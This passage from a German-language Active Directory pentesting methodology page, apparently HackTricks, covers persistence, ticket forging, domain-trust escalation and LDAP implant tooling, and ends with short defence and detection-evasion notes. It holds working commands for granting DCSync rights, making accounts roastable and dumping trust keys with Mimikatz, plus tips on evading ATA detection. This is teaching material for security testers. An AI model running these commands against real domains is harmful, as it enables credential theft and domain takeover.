Der kompromittierte Benutzer könnte einige **interessante Berechtigungen über Domain-Objekte** besitzen, die es ermöglichen, später lateral zu **move** oder Privilegien zu **escalate**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Entdecken eines **Spool service listening** innerhalb der Domain kann **missbraucht** werden, um **neue Credentials zu erlangen** und Privilegien zu **eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Nutzer** auf die **kompromittierte** Maschine **accessen**, ist es möglich, **Credentials aus dem Speicher zu sammeln** und sogar **beacons in ihre Prozesse zu injecten**, um sie zu impersonifizieren.\
Normalerweise greifen Nutzer via RDP auf Systeme zu — hier steht, wie man ein paar Angriffe auf Drittanbieter-RDP-Sitzungen performt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** stellt ein System zur Verwaltung des **lokalen Administrator-Passworts** auf domain-joined Computern bereit, sorgt dafür, dass es **randomized**, einzigartig und häufig **changed** wird. Diese Passwörter werden in Active Directory gespeichert und der Zugriff wird über ACLs nur auf authorisierte Benutzer beschränkt. Mit ausreichenden Rechten, um diese Passwörter zu lesen, ist Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von certificates** von der kompromittierten Maschine kann ein Weg sein, Privilegien innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **lauffähige templates** konfiguriert sind, können diese missbraucht werden, um Privilegien zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin** oder noch besser **Enterprise Admin** Rechte hast, kannst du die **Domain-Datenbank** dumpen: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können als Persistence genutzt werden.\
Beispiele:

- Benutzer anfällig für [**Kerberoast**](kerberoast.md) machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer anfällig für [**ASREPRoast**](asreproast.md) machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- [**DCSync**](#dcsync) Rechte an einen Benutzer vergeben

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erzeugt ein legitimes Ticket Granting Service (TGS) ticket für einen spezifischen Service, indem der **NTLM hash** verwendet wird (z. B. der **hash des PC-Accounts**). Diese Methode wird verwendet, um **Zugriff auf Service-Privilegien** zu erhalten.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** beinhaltet, dass ein Angreifer Zugriff auf den **NTLM hash des krbtgt accounts** in einer Active Directory-Umgebung erlangt. Dieses Konto ist besonders, da es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk essentiell sind.

Sobald der Angreifer diesen hash hat, kann er **TGTs** für beliebige Konten erstellen (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Das sind wie Golden Tickets, aber so gefälscht, dass sie **übliche Golden-Ticket-Detektionsmechanismen umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Zertifikate eines Kontos zu besitzen oder diese anfordern zu können** ist ein sehr guter Weg, im Benutzerkonto persistent zu bleiben (selbst wenn das Passwort geändert wird):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mit Zertifikaten ist es auch möglich, mit hohen Rechten innerhalb der Domain persistent zu bleiben:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory stellt die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins) sicher, indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL von AdminSDHolder so ändert, dass ein regulärer Benutzer volle Rechte erhält, erhält dieser Benutzer umfangreiche Kontrolle über alle privilegierten Gruppen. Diese Sicherheitsmaßnahme, die Schutz bieten soll, kann so ohne enge Überwachung zu ungewünschtem Zugriff führen.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administrator**-Konto. Wenn du Administratorrechte auf einem solchen Rechner erhältst, kann der lokale Administrator-hash mit **mimikatz** extrahiert werden. Danach ist eine Registry-Änderung nötig, um **die Nutzung dieses Passworts zu erlauben**, womit der Remote-Zugriff auf das lokale Administrator-Konto möglich wird.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** spezielle **Berechtigungen** an bestimmten Domain-Objekten geben, die es dem Benutzer erlauben, **zukünftig Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** speichern die **Permissions**, die ein **Objekt** über ein **Objekt** hat. Wenn du nur eine **kleine Änderung** am **security descriptor** eines Objekts vornimmst, kannst du sehr interessante Privilegien über dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die `dynamicObject` auxiliary class, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erzeugen; sie löschen sich selbst ohne Tombstones und beseitigen LDAP-Spuren, während orphan SIDs, gebrochene `gPLink`-Referenzen oder gecachte DNS-Antworten zurückbleiben (z. B. AdminSDHolder ACE pollution oder bösartige `gPCFileSysPath`/AD-integrated DNS-Redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Ändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugriff auf alle Domain-Konten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um **Credentials im Klartext** zu **capture**, die zum Zugriff auf die Maschine verwendet werden.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und nutzt ihn, um **Attribute** (SIDHistory, SPNs...) auf bestimmten Objekten **zu pushen**, **ohne** dabei Logs über die **Modifikationen** zu hinterlassen. Du **brauchst DA**-Privilegien und musst dich in der **root domain** befinden.\
Beachte, dass bei falschen Daten recht hässliche Logs entstehen können.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vorher haben wir besprochen, wie man Privilegien eskaliert, wenn man **ausreichende Rechte hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können aber auch zur **Aufrechterhaltung von Persistence** verwendet werden.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet die **Forest** als Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forest führen kann**.

### Basic Information

Ein [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domain** erlaubt, Ressourcen in einer anderen **Domain** zu nutzen. Er schafft eine Verbindung zwischen den Authentication-Systemen beider Domains, sodass Authentifizierungsanforderungen fließen können. Beim Einrichten eines Trusts tauschen die Domains bestimmte **Keys** zwischen ihren **Domain Controllers (DCs)** aus und behalten diese, da sie für die Integrität des Trusts wichtig sind.

In einem typischen Szenario, wenn ein Benutzer auf einen Service in einer **trusted domain** zugreifen möchte, muss er zuerst ein spezielles Ticket, ein **inter-realm TGT**, von seinem eigenen Domain-DC anfordern. Dieses TGT ist mit einem geteilten **Key** verschlüsselt, den beide Domains vereinbart haben. Der Benutzer präsentiert dieses TGT dann dem **DC der trusted domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der trusted domain, stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Service gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM hash** nutzt, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt bei erfolgreicher Authentifizierung ein neues TGT aus.
3. Der Client fordert danach ein **inter-realm TGT** von DC1 an, welches benötigt wird, um Ressourcen in **Domain 2** zu erreichen.
4. Das inter-realm TGT ist mit einem **trust key** verschlüsselt, der zwischen DC1 und DC2 als Teil des zweiseitigen Domain-Trusts geteilt wird.
5. Der Client bringt das inter-realm TGT zu **Domain 2's Domain Controller (DC2)**.
6. DC2 überprüft das inter-realm TGT mit seinem geteilten trust key und stellt, falls gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, das mit dem hash des Server-Accounts verschlüsselt ist, um Zugriff auf den Service in Domain 2 zu erhalten.

### Different trusts

Wichtig zu beachten: **Ein Trust kann einseitig oder zweiseitig sein**. Bei einer zweiseitigen Trust-Option vertrauen sich beide Domains gegenseitig, während bei einer **one-way** Trust-Beziehung eine Domain die **trusted** und die andere die **trusting** Domain ist. In diesem Fall **kannst du nur aus der trusted Domain auf Ressourcen der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted Domain. Außerdem wäre dies in **Domain A** ein **Outbound trust**; in **Domain B** hingegen ein **Inbound trust**.

**Verschiedene Vertrauensbeziehungen**

- **Parent-Child Trusts**: Häufig innerhalb desselben Forests, wobei eine Child-Domain automatisch eine zweiseitige transitive Trust mit ihrer Parent-Domain hat. Authentifizierungsanfragen können so nahtlos zwischen Parent und Child fließen.
- **Cross-link Trusts**: Auch "shortcut trusts" genannt, werden zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssten Authentifizierungs-Referrals sonst bis zur Forest-Root gehen und dann zur Ziel-Domain hinab. Cross-links verkürzen diese Strecke, was besonders in geografisch verteilten Umgebungen hilfreich ist.
- **External Trusts**: Werden zwischen unterschiedlichen, nicht verwandten Domains eingerichtet und sind per Definition non-transitive. Laut [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind external trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Die Sicherheit wird durch SID filtering bei external trusts verstärkt.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einem neu hinzugefügten Tree-Root eingerichtet. Sie sind nicht häufig, aber wichtig, um neue Domain-Trees zu einem Forest hinzuzufügen, wodurch diese einen einzigartigen Domain-Namen behalten und zweiseitige Transitivität sicherstellen. Mehr Infos in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ein zweiseitiger transiver Trust zwischen zwei Forest-Root-Domains, der ebenfalls SID filtering nutzt, um die Sicherheit zu erhöhen.
- **MIT Trusts**: Diese Trusts werden mit non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT trusts sind spezialisierter und dienen der Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems.

#### Weitere Unterschiede in **trusting relationships**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **non-transitiv**.
- Eine Trust-Beziehung kann als **bidirectional trust** (beidseitiges Vertrauen) oder als **one-way trust** (nur eine Seite vertraut der anderen) konfiguriert sein.

### Attack Path

1. **Enumerate** die trusting relationships
2. Prüfe, ob irgendein **security principal** (user/group/computer) **access** auf Ressourcen der **anderen Domain** hat, vielleicht durch ACE-Einträge oder weil er in Gruppen der anderen Domain ist. Suche nach **relationships across domains** (wahrscheinlich wurde der Trust dafür erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. **Compromise** die **accounts**, die durch Domains **pivoten** können.

Angreifer können auf Ressourcen in einer anderen Domain über drei primäre Mechanismen zugreifen:

- **Local Group Membership**: Principals können zu lokalen Gruppen auf Maschinen hinzugefügt werden, z. B. zur “Administrators”-Gruppe auf einem Server, was ihnen großen Einfluss auf diese Maschine gibt.
- **Foreign Domain Group Membership**: Principals können auch Mitglieder von Gruppen in der fremden Domain sein. Die Wirksamkeit hängt jedoch von der Natur des Trusts und dem Scope der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** spezifiziert sein, insbesondere als Einträge in **ACEs** innerhalb einer **DACL**, was ihnen Zugriff auf spezifische Ressourcen gibt. Wer tiefer in die Mechanik von ACLs, DACLs und ACEs einsteigen will, dem sei das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” empfohlen.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um foreign security principals in der Domain zu finden. Das sind Benutzer/Gruppen aus **einer externen Domain/Forest**.

Das kannst du in **Bloodhound** oder mit **powerview** prüfen:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten, domain trusts zu enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, einen für _Child --> Parent_ und einen weiteren für _Parent_ --> _Child_.\
> Du kannst den von der aktuellen Domain verwendeten trusted key mit:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in das child/parent domain eskalieren, indem der Trust mit SID-History injection missbraucht wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Es ist entscheidend zu verstehen, wie die Configuration Naming Context (NC) ausgenutzt werden kann. Die Configuration NC dient als zentrales Repository für Konfigurationsdaten über einen Forest in Active Directory (AD)-Umgebungen. Diese Daten werden an jeden Domain Controller (DC) im Forest repliziert; writable DCs halten eine beschreibbare Kopie der Configuration NC. Um dies auszunutzen, muss man **SYSTEM privileges on a DC** haben, vorzugsweise auf einem child DC.

**Link GPO to root DC site**

Der Sites-Container der Configuration NC enthält Informationen über die Sites aller domain-gebundenen Computer innerhalb des AD-Forest. Mit SYSTEM privileges auf einem beliebigen DC können Angreifer GPOs mit den root DC sites verknüpfen. Diese Aktion kann die root domain kompromittieren, indem die auf diese Sites angewendeten Richtlinien manipuliert werden.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ein Angriffsvektor zielt auf privilegierte gMSAs innerhalb der Domain ab. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs unerlässlich ist, wird in der Configuration NC gespeichert. Mit SYSTEM privileges auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für beliebige gMSAs im gesamten Forest zu berechnen.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld — das Warten auf die Erstellung neuer privilegierter AD-Objekte. Mit SYSTEM privileges kann ein Angreifer das AD Schema ändern, um jedem Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Das kann zu unautorisiertem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-Schwachstelle zielt auf die Kontrolle über Public Key Infrastructure (PKI)-Objekte ab, um eine Zertifikatvorlage zu erstellen, die eine Authentifizierung als beliebiger Benutzer im Forest ermöglicht. Da PKI-Objekte in der Configuration NC liegen, erlaubt die Kompromittierung eines writable child DC die Durchführung von ESC5-Angriffen.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Szenarien ohne ADCS kann der Angreifer die notwendigen Komponenten selbst einrichten, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario wird **deine Domain** von einer externen Domain vertraut und dir werden dadurch **nicht näher bestimmte Berechtigungen** an dieser gewährt. Du musst herausfinden, **welche principals deiner Domain welchen Zugriff auf die externe Domain haben**, und dann versuchen, exploit it:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domain - Einweg (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **deine Domäne** einem Principal aus einer **anderen Domäne** einige **Privilegien**.

Wenn jedoch eine **Domäne von der vertrauenden Domäne** vertraut wird, erstellt die vertrauene Domäne einen Benutzer mit einem **vorhersehbaren Namen**, dessen **Passwort das trusted password** ist. Das bedeutet, dass es möglich ist, einen Benutzer aus der vertrauenden Domäne zu nutzen, um sich in die vertrauene Domäne einzuloggen, sie zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauene Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in die **entgegengesetzte Richtung** der Domänenvertrauensstellung erstellt wurde (was nicht sehr häufig ist).

Eine weitere Möglichkeit, die vertrauene Domäne zu kompromittieren, besteht darin, sich auf einer Maschine zu positionieren, auf die sich ein **Benutzer aus der vertrauenen Domäne** per **RDP** anmelden kann. Dann könnte der Angreifer Code in den RDP-Session-Prozess injizieren und von dort aus auf die **Ursprungsdomäne des Opfers** zugreifen.\
Außerdem, falls das **Opfer seine Festplatte eingebunden hat**, könnte der Angreifer über den **RDP-Session**-Prozess **backdoors** im **Startup folder of the hard drive** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest-Trusts ausnutzen, wird durch SID Filtering gemindert, das standardmäßig auf allen inter-forest trusts aktiviert ist. Dies beruht auf der Annahme, dass intra-forest trusts sicher sind, wobei Microsoft den Forest und nicht die Domain als Sicherheitsgrenze betrachtet.
- Allerdings gibt es einen Haken: SID Filtering kann Anwendungen und Benutzerzugriffe stören, was dazu führen kann, dass es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei inter-forest trusts sorgt Selective Authentication dafür, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domäne oder des Forests zugreifen können.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das trust account schützen.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitiven als x64 Beacon Object Files neu, die vollständig innerhalb eines on-host implant (z. B. Adaptix C2) laufen. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon aus auf. Der gesamte Verkehr läuft im aktuellen Logon-Sicherheitskontext über LDAP (389) mit signing/sealing oder LDAPS (636) mit automatischem Zertifikatvertrauen, sodass keine socks proxies oder Festplatten-Artefakte erforderlich sind.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, und `get-groupmembers` lösen Kurzbezeichnungen/OU-Pfade in vollständige DNs auf und dumpen die entsprechenden Objekte.
- `get-object`, `get-attribute`, und `get-domaininfo` holen beliebige Attribute (einschließlich security descriptors) sowie die Forest/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, und `get-rbcd` zeigen roasting candidates, Delegationseinstellungen und vorhandene [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) Deskriptoren direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` parsen die DACL, um trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) und Vererbung aufzulisten und liefern damit unmittelbare Ziele für ACL-Privilegieneskalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) erlauben es dem Operator, neue principals oder machine accounts dort zu stagen, wo OU rights existieren. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` hijacken targets direkt, sobald write-property rights gefunden werden.
- ACL-focused commands wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner auf jedem AD-Objekt in password resets, group membership control oder DCSync replication privileges um, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*` Gegenstücke räumen injizierte ACEs wieder auf.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` machen einen kompromittierten User sofort Kerberoastable; `add-asreproastable` (UAC toggle) markiert ihn für AS-REP roasting, ohne das Passwort zu berühren.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon um, ermöglichen constrained/unconstrained/RBCD Angriffspfade und eliminieren die Notwendigkeit für remote PowerShell oder RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so stealthy access inheritance vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/OU von Computern oder Usern und erlaubt einem Angreifer, Assets in OUs zu verschieben, in denen bereits delegated rights bestehen, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng begrenzte Removal-Kommandos (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) erlauben ein schnelles Rollback, nachdem der Operator Credentials oder Persistence geerntet hat, und minimieren Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Erfahre hier mehr darüber, wie man credentials schützt.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Es wird empfohlen, dass Domain Admins sich nur an Domain Controllers anmelden dürfen und nicht auf anderen Hosts verwendet werden.
- **Service Account Privileges**: Services sollten nicht mit Domain Admin (DA) Rechten ausgeführt werden, um die Sicherheit zu erhalten.
- **Temporal Privilege Limitation**: Für Aufgaben, die DA-Privilegien erfordern, sollte deren Dauer begrenzt werden. Das kann erreicht werden mit: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 überwachen und anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients erzwingen, um LDAP MITM/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementing deception beinhaltet das Stellen von Fallen, wie Decoy-Usern oder -Computern, mit Eigenschaften wie Passwords that do not expire oder markiert als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Usern mit spezifischen Rechten oder das Hinzufügen zu hoch privilegierten Gruppen.
- Ein praktisches Beispiel verwendet Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Deployen von deception techniques findet sich bei [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdächtige Indikatoren umfassen atypische ObjectSID, seltene logons, Erstellungsdaten und niedrige bad password counts.
- **General Indicators**: Der Vergleich von Attributen potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können beim Erkennen solcher Deceptions helfen.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeide Session-Enumeration auf Domain Controllers, um ATA-Detection zu verhindern.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys für die Ticket-Erstellung hilft, Detection zu umgehen, indem ein Downgrade auf NTLM vermieden wird.
- **DCSync Attacks**: Es wird empfohlen, DCSync von einem non-Domain Controller auszuführen, um ATA-Detection zu vermeiden, da direkte Ausführung auf einem Domain Controller Alerts auslöst.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
